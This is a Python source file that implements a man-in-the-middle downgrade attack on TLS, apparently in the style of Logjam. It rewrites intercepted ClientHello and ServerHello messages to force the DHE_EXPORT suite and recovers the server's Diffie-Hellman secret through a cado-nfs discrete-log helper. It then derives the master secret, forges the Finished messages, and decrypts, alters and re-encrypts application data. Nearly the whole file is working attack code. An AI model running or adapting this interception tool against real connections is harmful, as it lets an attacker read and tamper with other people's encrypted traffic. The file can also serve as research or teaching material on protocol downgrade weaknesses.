from utils import *
from crypto import *
import cado_nfs_helper
import hmac

# https://tls.ulfheim.net/, https://en.wikipedia.org/wiki/Transport_Layer_Security#Protocol_details

class Context():
    def __init__(self):
        self.tls_version = None
        self.client_random = None
        self.server_random = None
        self.client_pubkey = None
        self.server_pubkey = None
        self.p = None
        self.server_changed_cipher_spec = False
        self.client_changed_cipher_spec = False
        self.client_cipher_suite = None
        self.handshake_server_view = b""
        self.handshake_client_view = b""
        self.seq_num_client_server = 0
        self.seq_num_server_client = 0
        self.tmp_incomplete_tls_record = None
        self.server_seq = 0
        self.server_seq_diff = 0
        self.client_seq = 0
        self.client_seq_diff = 0
        self.requested_url = ""
        self.master_secret = None

def parse_tls_records(ctx, tcp_data, from_server, tmp=None):
    # one frame can include multiple tls messages and a tls message can overlap into the next frame
    # that's why we recursively fill an array and maintain a property "complete"

    if (tmp == None):
        tmp = []
        offset = 0
    else:
        offset = tmp[-1]["to"]

    is_encrypted = False
    if ((from_server and ctx.server_changed_cipher_spec) or (not from_server and ctx.client_changed_cipher_spec)):
        is_encrypted = True

    if (tcp_data[offset:offset+1] == b"\x16"):
        record_len = bytes2int(tcp_data[offset+3:offset+5])
        handshake_message_type_byte = tcp_data[offset+5:offset+6]
        if (is_encrypted):
            decrypted_message = decrypt_tls_record(ctx, tcp_data[offset:offset+record_len+5], from_server)
            handshake_message_type_byte = decrypted_message[0:1]

        if (handshake_message_type_byte == b"\x01"):
            record_type = "ClientHello"
        elif (handshake_message_type_byte == b"\x02"):
            record_type = "ServerHello"
            set_tls_version(ctx, tcp_data[offset+1:offset+3])
        elif (handshake_message_type_byte == b"\x04"):
            record_type = "NewSessionTicket"
        elif (handshake_message_type_byte == b"\x0b"):
            record_type = "ServerCertificate"
        elif (handshake_message_type_byte == b"\x0c"):
            record_type = "ServerKeyExchange"
            parse_server_key_exchange(ctx, tcp_data[offset:offset+record_len+5])
        elif (handshake_message_type_byte == b"\x0e"):
            record_type = "ServerHelloDone"
        elif (handshake_message_type_byte == b"\x10"):
            record_type = "ClientKeyExchange"
            parse_client_key_exchange(ctx, tcp_data[offset:offset+record_len+5])
        elif (handshake_message_type_byte == b"\x14"):
            record_type = "ServerHandshakeFinished" if from_server else "ClientHandshakeFinished"
        else:
            record_type = "???" # might be after ChangeCipherSpec (encrypted)
            if (is_encrypted):
                print(bytestring_to_hex(decrypted_message))
    elif (tcp_data[offset:offset+1] == b"\x14"):
        record_type = "ChangeCipherSpec"
        record_len = bytes2int(tcp_data[offset+3:offset+5])
        if (from_server):
            ctx.server_changed_cipher_spec = True
        else:
            ctx.client_changed_cipher_spec = True
    elif (tcp_data[offset:offset+1] in [b"\x15", b"\x17"]):
        if (tcp_data[offset:offset+1] == b"\x15"):
            record_type = "Alert"
        elif (tcp_data[offset:offset+1] == b"\x17"):
            record_type = "ApplicationData"
        record_len = bytes2int(tcp_data[offset+3:offset+5])
        if (is_encrypted):
            decrypted_message = "will be decrypted during manipulation"
    else:
        return tmp

    print(record_type)
    
    cur = {
        "from_server": from_server,
        "type": record_type, # either the record content type or the handshake message type
        "from": offset,
        "to": offset + record_len + 5,
        "complete": len(tcp_data) >= offset + record_len + 5
    }
    cur["msg"] = tcp_data[cur["from"]:cur["to"]]
    if (is_encrypted):
        cur["decrypted"] = decrypted_message
    tmp.append(cur)

    if (len(tcp_data) > offset + record_len + 5):
        # further tls messages are following
        parse_tls_records(ctx, tcp_data, from_server, tmp)

    return tmp

def set_tls_version(ctx, tls_version_bytes):
    for b,v in [[b"\x03\x01", "1.0"],[b"\x03\x02", "1.1"],[b"\x03\x03", "1.2"]]:
        if (tls_version_bytes == b):
            ctx.tls_version = v
            return

dhe_cipher_suites = [b"\x00\x33", # RSA AES 128 CBC SHA
                    b"\x00\x16", # RSA 3DES EDE CBC SHA
                    b"\x00\x15", # RSA DES CBC SHA
                    b"\x00\x14" # RSA DES40 CBC SHA
]
def cipher_suite_to_string(cipher_suite):
    cipher_suite_hex_value = bytestring_to_hex(cipher_suite)
    name = ""
    if (cipher_suite == b"\x00\x14"):
        name = "TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA"
    elif (cipher_suite == b"\x00\x15"):
        name = "TLS_DHE_RSA_WITH_DES_CBC_SHA"
    elif (cipher_suite == b"\x00\x16"):
        name = "TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA"
    elif (cipher_suite == b"\x00\x33"):
        name = "TLS_DHE_RSA_WITH_AES_128_CBC_SHA"
    return cipher_suite_hex_value + (" " if name else "") + name

def parse_server_key_exchange(ctx, msg):
    # https://wiki.osdev.org/TLS_Handshake#Server_Key_Exchange_Message
    p_length = bytes2int(msg[9:11])
    ctx.p = msg[11:11+p_length]
    p_hex = bytestring_to_hex(ctx.p, "", "0x")
    print("p (", p_length*8, "bit)", p_hex)

    g_offset = 11 + p_length
    g_length = bytes2int(msg[g_offset:g_offset+2])
    g = msg[g_offset+2:g_offset+2+g_length]

    pubkey_offset = g_offset + 2 + g_length
    pubkey_length = bytes2int(msg[pubkey_offset:pubkey_offset+2])
    pubkey = msg[pubkey_offset+2:pubkey_offset+2+pubkey_length]
    pubkey_hex = bytestring_to_hex(pubkey, "", "0x")
    print("pubkey (", pubkey_length*8, "bit)", pubkey_hex)
    ctx.server_pubkey = pubkey

    signature_offset = pubkey_offset + 2 + pubkey_length
    signature_hash_alg = msg[signature_offset:signature_offset+2]
    signature_length = bytes2int(msg[signature_offset+2:signature_offset+4])
    signature = msg[signature_offset+4:signature_offset+4+signature_length]

def parse_client_key_exchange(ctx, msg):
    pubkey_length = bytes2int(msg[9:11])
    pubkey = msg[11:11+pubkey_length]
    print("pubkey (", pubkey_length*8, "bit)", bytestring_to_hex(pubkey, "", "0x"))
    ctx.client_pubkey = pubkey

def manipulate_tls_records(ctx, tls_records, func_replace_tls_content):
    # check whether it's one of the messages we want to manipulate
    # remove incomplete messages at the end (if we need to manipulate them)
    manipulated, manipulated_tls_record = False, []

    server_closed, client_closed = False, False

    for tls_record in tls_records:
        if (tls_record["type"] == "ClientHello"):
            msg = tls_record["msg"]
            handshake_len = bytes2int(msg[3:5])
            client_hello_len = bytes2int(msg[6:9])
            ctx.client_random = msg[11:43]
            session_id_len = bytes2int(msg[43:44])
            cipher_suite_byte_len = bytes2int(msg[44+session_id_len:44+session_id_len+2])
            cipher_suites = []
            ctx.client_cipher_suite = None
            for i in range(0, cipher_suite_byte_len, 2):
                cur_ciphersuite = msg[46+session_id_len+i:46+session_id_len+i+2]
                cipher_suites.append(cur_ciphersuite)
            # we need to confirm a DHE cipher suite (the client asked for) later; prefer server(mitm) order
            for dhe_cipher_suite in dhe_cipher_suites:
                if (dhe_cipher_suite in cipher_suites):
                    ctx.client_cipher_suite = dhe_cipher_suite
                    break
            print("ClientHello cipher suites:", [bytestring_to_hex(c) for c in cipher_suites])
            print("We ask for:", cipher_suite_to_string(b"\x00\x14"))

            compression_offset = 46 + session_id_len + cipher_suite_byte_len
            compression_len = bytes2int(msg[compression_offset:compression_offset+1])
            extensions_offset = compression_offset + compression_len + 1
            extensions_len = bytes2int(msg[extensions_offset:extensions_offset+2])
            extensions_data = msg[extensions_offset+2:extensions_offset+2+extensions_len]
            new_extensions_data = b""
            temp_extensions_offset = 0
            while (temp_extensions_offset < len(extensions_data)):
                extension_type = extensions_data[temp_extensions_offset:temp_extensions_offset+2]
                extension_len = bytes2int(extensions_data[temp_extensions_offset+2:temp_extensions_offset+4])
                extension_data = extensions_data[temp_extensions_offset+4:temp_extensions_offset+4+extension_len]
                #print("type:", bytestring_to_hex(extension_type), "(", extension_len, "byte )", bytestring_to_hex(extension_data))
                temp_extensions_offset += extension_len + 4
                # ignore/remove extensions: Next Protocol Negotiation
                if (extension_type in [b"\x33\x74"]):
                    continue
                new_extensions_data += extensions_data[temp_extensions_offset-4-extension_len:temp_extensions_offset]

            # we only want to have 00 14 (DHE EXPORT), but we also need to adjust the length headers
            handshake_length_diff = 2 - cipher_suite_byte_len - session_id_len - len(extensions_data) + len(new_extensions_data)
            new_msg = msg[:3] + int2bytes(handshake_len + handshake_length_diff, 2) + \
                msg[5:6] + int2bytes(client_hello_len + handshake_length_diff, 3) + \
                msg[9:43] + b"\x00" + \
                b"\x00\x02" + b"\x00\x14" + \
                msg[compression_offset:extensions_offset] + \
                int2bytes(len(new_extensions_data), 2) + new_extensions_data + \
                msg[extensions_offset+2+extensions_len:]

            manipulated_tls_record.append(new_msg)
            manipulated = True
            ctx.handshake_client_view = msg[5:]
            ctx.handshake_server_view = new_msg[5:]
            continue

        elif (tls_record["type"] == "ServerHello"):
            msg = tls_record["msg"]
            ctx.server_random = msg[11:43]
            session_id_len = bytes2int(msg[43:44])
            cipher_suite = msg[44+session_id_len:44+session_id_len+2]
            print("ServerHello chosen cipher suite:", cipher_suite_to_string(cipher_suite))
            if (ctx.client_cipher_suite == None):
                raise Exception("No cipher suite in ClientHello we can confirm!")
            print("We confirm:", cipher_suite_to_string(ctx.client_cipher_suite))

            new_msg = msg[:44+session_id_len] + ctx.client_cipher_suite + msg[44+session_id_len+2:]
            manipulated_tls_record.append(new_msg)
            manipulated = True
            ctx.handshake_client_view += new_msg[5:]
            ctx.handshake_server_view += msg[5:]
            continue

        elif (tls_record["type"] == "ServerCertificate" and tls_record["complete"]):
            ctx.handshake_client_view += tls_record["msg"][5:]
            ctx.handshake_server_view += tls_record["msg"][5:]
        elif (tls_record["type"] in ["ServerKeyExchange", "ServerHelloDone", "ClientKeyExchange", "NewSessionTicket"]):
            ctx.handshake_client_view += tls_record["msg"][5:]
            ctx.handshake_server_view += tls_record["msg"][5:]

        elif (tls_record["type"] == "ClientHandshakeFinished"):
            handshake_hash = compute_handshake_hash(ctx, ctx.handshake_server_view)
            verify_data_server_view = tls_prf(ctx, get_master_secret(ctx), "client finished", handshake_hash, 12)

            # prepend record header (14 for handshake finished + 3 byte length (12=0c))
            new_msg_handshake = b"\x14\x00\x00\x0c" + verify_data_server_view
            iv, encrypted_msg_handshake = encrypt_tls_record(ctx, tls_record["msg"][:3] + int2bytes(len(new_msg_handshake), 2) + new_msg_handshake, False)
            new_msg_record = tls_record["msg"][:3] + int2bytes(len(encrypted_msg_handshake) + len(iv), 2) + iv + encrypted_msg_handshake
            manipulated_tls_record.append(new_msg_record)
            manipulated = True
            ctx.handshake_client_view += tls_record["decrypted"]
            continue

        elif (tls_record["type"] == "ServerHandshakeFinished"):
            handshake_hash = compute_handshake_hash(ctx, ctx.handshake_client_view)
            verify_data_client_view = tls_prf(ctx, get_master_secret(ctx), "server finished", handshake_hash, 12)

            new_msg_handshake = b"\x14\x00\x00\x0c" + verify_data_client_view
            iv, encrypted_msg_handshake = encrypt_tls_record(ctx, tls_record["msg"][:3] + int2bytes(len(new_msg_handshake), 2) + new_msg_handshake, True)
            new_msg_record = tls_record["msg"][:3] + int2bytes(len(encrypted_msg_handshake) + len(iv), 2) + iv + encrypted_msg_handshake
            manipulated_tls_record.append(new_msg_record)
            manipulated = True
            continue

        elif (tls_record["type"] in ["ApplicationData", "Alert"] and "decrypted" in tls_record):
            msg = tls_record
            if (not msg["complete"]):
                # drop packet (not appending to manipulated) now and work on it once its complete
                manipulated = True
                continue
            if (msg["from_server"]):
                ctx.seq_num_server_client += 1
                seq_num = ctx.seq_num_server_client
            else:
                ctx.seq_num_client_server += 1
                seq_num = ctx.seq_num_client_server
            decrypted_message = decrypt_tls_record(ctx, msg["msg"], msg["from_server"], seq_num)
            manipulated_message = func_replace_tls_content(decrypted_message)
            iv, encrypted_msg = encrypt_tls_record(ctx, msg["msg"][:3] + int2bytes(len(manipulated_message), 2) + manipulated_message, msg["from_server"], seq_num)
            new_msg_record = msg["msg"][:3] + int2bytes(len(encrypted_msg) + len(iv), 2) + iv + encrypted_msg
            manipulated_tls_record.append(new_msg_record)
            manipulated = True

            if (tls_record["type"] == "Alert" and decrypted_message == b"\x01\x00"):
                # Close Notify
                if (msg["from_server"]):
                    ctx.server_changed_cipher_spec = False
                    ctx.seq_num_server_client = 0
                    server_closed = True
                else:
                    ctx.client_changed_cipher_spec = False
                    ctx.seq_num_client_server = 0
                    client_closed = True
            continue

        manipulated_tls_record.append(tls_record["msg"])

    return manipulated, manipulated_tls_record, server_closed, client_closed

def compute_handshake_hash(ctx, handshake):
    if (ctx.tls_version in ["1.0", "1.1"]):
        return hash_md5(handshake) + hash_sha1(handshake)
    elif (ctx.tls_version in ["1.2"]):
        return hash_sha256(handshake)
    else:
        raise Exception("Unknown TLS version")

def compute_discrete_log(p, target):
    p = int(bytestring_to_hex(p, "", "0x"), 16)
    target = int(bytestring_to_hex(target, "", "0x"), 16)
    return cado_nfs_helper.compute(p, target)

def decrypt_tls_record(ctx, record, from_server, seq_num=0):
    mac_alg, cipher, iv_length, client_write_mac_key, server_write_mac_key, client_write_key, server_write_key = get_algorithms_and_write_keys(ctx, from_server)

    iv = record[5:5+iv_length]
    c = record[5+iv_length:]
    #print(cipher, "iv", bytestring_to_hex(iv), "c", bytestring_to_hex(c))


    if (from_server):
        decryption_key = server_write_key
        mac_key = server_write_mac_key
    else:
        decryption_key = client_write_key
        mac_key = client_write_mac_key

    try:
        if (cipher.startswith("DES")):
            decrypted = decrypt_des_cbc(decryption_key, c, iv)
        elif (cipher == "3DES"):
            decrypted = decrypt_3des_ede_cbc(decryption_key, c, iv)
        elif (cipher.startswith("AES")):
            decrypted = decrypt_aes_cbc(decryption_key, c, iv)
        else:
            raise Exception("Unknown cipher")
    except Exception as e:
        decrypted = b"exception"
        print(e)

    if (mac_alg == "SHA1"):
        message = decrypted[:-20]
        message_mac = decrypted[-20:]
        # sequence number (8 bytes), 3 bytes from record header (type + version), length of decrypted message, message
        mac_input = int2bytes(seq_num, 8) + record[:3] + int2bytes(len(message), 2) + message
        comp_mac = hmac.new(mac_key, mac_input, mac_alg.lower()).digest()
        if (message_mac != comp_mac):
            #raise Exception("Computed MAC doesn't match")
            print("mac wrong", message, message_mac)
    else:
        raise Exception("Unknown MAC algorithm")

    return message

def encrypt_tls_record(ctx, record, from_server, seq_num=0):
    mac_alg, cipher, iv_length, client_write_mac_key, server_write_mac_key, client_write_key, server_write_key = get_algorithms_and_write_keys(ctx, not from_server)

    if (from_server):
        write_mac_key = server_write_mac_key
        write_key = server_write_key
    else:
        write_mac_key = client_write_mac_key
        write_key = client_write_key

    #MAC(MAC_write_key, seq_num_8bytes + record_header + record_payload)
    seq_num_bytes = int2bytes(seq_num, 8)
    mac = hmac.new(write_mac_key, seq_num_bytes + record, mac_alg.lower()).digest()
    if (cipher.startswith("DES")):
        iv, c = encrypt_des_cbc(write_key, record[5:] + mac)
    elif (cipher == "3DES"):
        iv, c = encrypt_3des_ede_cbc(write_key, record[5:] + mac)
    elif (cipher.startswith("AES")):
        iv, c = encrypt_aes_cbc(write_key, record[5:] + mac)
    else:
        raise Exception("Unknown cipher")

    return iv, c

def get_algorithms_and_write_keys(ctx, for_mitm_server_connection):
    mac_alg = "SHA1" # all of the below are SHA currently
    if (for_mitm_server_connection):
        cipher = "DES40"
    else:
        if (ctx.client_cipher_suite in [b"\x00\x15"]):
            cipher = "DES"
        elif (ctx.client_cipher_suite in [b"\x00\x14"]):
            cipher = "DES40"
        elif (ctx.client_cipher_suite in [b"\x00\x16"]):
            cipher = "3DES"
        elif (ctx.client_cipher_suite in [b"\x00\x33"]):
            cipher = "AES128"
        else:
            raise Exception("Unknown cipher suite")

    if (cipher.startswith("DES") or cipher == "3DES"):
        iv_length = 8
    elif (cipher.startswith("AES")):
        iv_length = 16
    else:
        raise Exception("Unknown cipher")

    if (cipher == "DES"):
        enc_key_length = 8
    elif (cipher == "DES40"):
        enc_key_length = 5
    elif (cipher == "3DES"):
        enc_key_length = 24
    elif (cipher == "AES128"):
        enc_key_length = 16
    else:
        raise Exception("Unknown cipher")

    if (mac_alg == "SHA1"):
        mac_key_length = 20
    else:
        raise Exception("Unknown MAC algorithm")

    master_secret = get_master_secret(ctx)
    client_write_mac_key, server_write_mac_key, client_write_key, server_write_key = get_write_keys_from_master_secret(ctx, master_secret, mac_key_length, enc_key_length, iv_length, cipher == "DES40")

    return mac_alg, cipher, iv_length, client_write_mac_key, server_write_mac_key, client_write_key, server_write_key

def get_master_secret(ctx):
    if (ctx.master_secret != None):
        return ctx.master_secret

    try:
        server_seckey = compute_discrete_log(ctx.p, ctx.server_pubkey)
        server_seckey = remove_leading_zero_bytes(int2bytes(server_seckey, len(ctx.p)))
        print("cado-nfs: secret key", server_seckey, "for pubkey", ctx.server_pubkey)
    except Exception as e:
        print("cado-nfs failed")
        print(e)
        server_seckey = ctx.server_pubkey # mocked for now

    # compute master secret and derived keys
    Z = exp(bytes2int(ctx.client_pubkey), bytes2int(server_seckey), bytes2int(ctx.p))
    pre_master_secret = remove_leading_zero_bytes(int2bytes(Z, len(ctx.p)))
    ctx.master_secret = tls_prf(ctx, pre_master_secret, "master secret", ctx.client_random + ctx.server_random, 48)
    print("Master Secret:", bytestring_to_hex(ctx.master_secret))
    return ctx.master_secret

def get_write_keys_from_master_secret(ctx, master_secret, mac_key_length, enc_key_length, iv_length, is_export):
    key_block = tls_prf(ctx, master_secret, "key expansion", ctx.server_random + ctx.client_random, 2 * (mac_key_length + enc_key_length + iv_length))
    client_write_mac_key = key_block[:mac_key_length]
    server_write_mac_key = key_block[mac_key_length:2*mac_key_length]
    client_write_key = key_block[2*mac_key_length:2*mac_key_length+enc_key_length]
    server_write_key = key_block[2*mac_key_length+enc_key_length:2*(mac_key_length+enc_key_length)]
    client_write_iv = key_block[2*(mac_key_length+enc_key_length):2*(mac_key_length+enc_key_length) + iv_length]
    server_write_iv = key_block[2*(mac_key_length+enc_key_length) + iv_length:]

    if (is_export):
        # RFC 2246, p. 22
        client_write_key = tls_prf(ctx, client_write_key, "client write key", ctx.client_random + ctx.server_random, 8)
        server_write_key = tls_prf(ctx, server_write_key, "server write key", ctx.client_random + ctx.server_random, 8)
        iv_block = tls_prf(ctx, b"", "IV block", ctx.client_random + ctx.server_random, 2*iv_length)
        client_write_iv = iv_block[:iv_length]
        server_write_iv = iv_block[iv_length:]

    return client_write_mac_key, server_write_mac_key, client_write_key, server_write_key

def tls_prf(ctx, secret, label, seed, n_bytes):
    if (ctx.tls_version in ["1.0", "1.1"]):
        return tls_prf_md5sha1(secret, label, seed, n_bytes)
    elif (ctx.tls_version in ["1.2"]):
        return _tls_prf(secret, label, seed, n_bytes)
    else:
        raise Exception("Unknown TLS version")

def _tls_prf(secret, label, seed, n_bytes, hash_alg="sha256"):
    # https://datatracker.ietf.org/doc/html/rfc5246#section-5
    seed = label.encode() + seed
    def hmac_hash(m):
        return hmac.new(secret, m, hash_alg).digest()
    a = [seed]
    p = b""
    while(len(p) < n_bytes):
        a.append(hmac_hash(a[-1]))
        p += hmac_hash(a[-1] + seed)
    return p[:n_bytes]

def tls_prf_md5sha1(secret, label, seed, n_bytes):
    ls1 = (len(secret) + len(secret)%2)//2
    s1 = secret[:ls1]
    s2 = secret[-ls1:]
    p_md5 = _tls_prf(s1, label, seed, n_bytes, "md5")
    p_sha1 = _tls_prf(s2, label, seed, n_bytes, "sha1")
    return int2bytes(int.from_bytes(p_md5, "big") ^ int.from_bytes(p_sha1, "big"), n_bytes)

